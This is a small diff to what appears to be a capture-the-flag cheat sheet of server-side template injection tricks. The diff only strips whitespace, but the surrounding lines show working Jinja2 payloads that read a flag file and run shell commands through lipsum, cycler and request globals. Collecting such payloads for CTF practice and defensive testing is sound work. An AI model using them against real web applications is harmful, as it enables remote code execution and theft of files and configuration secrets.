@@ -14,7 +14,7 @@ tricks:
     payload: |
       # Test SSTI:
       {{7*7}}  # Returns 49
-      
+
       # Read file:
       {{request.application.__globals__.__builtins__.open('/tmp/flag').read()}}
 
@@ -24,9 +24,9 @@ tricks:
     payload: |
       # Access config:
       {{config}}
-      
+
       # Via lipsum:
       {{lipsum.__globals__['os'].popen('cat /tmp/flag').read()}}
-      
+
       # Via cycler:
       {{cycler.__init__.__globals__.os.popen('id').read()}}
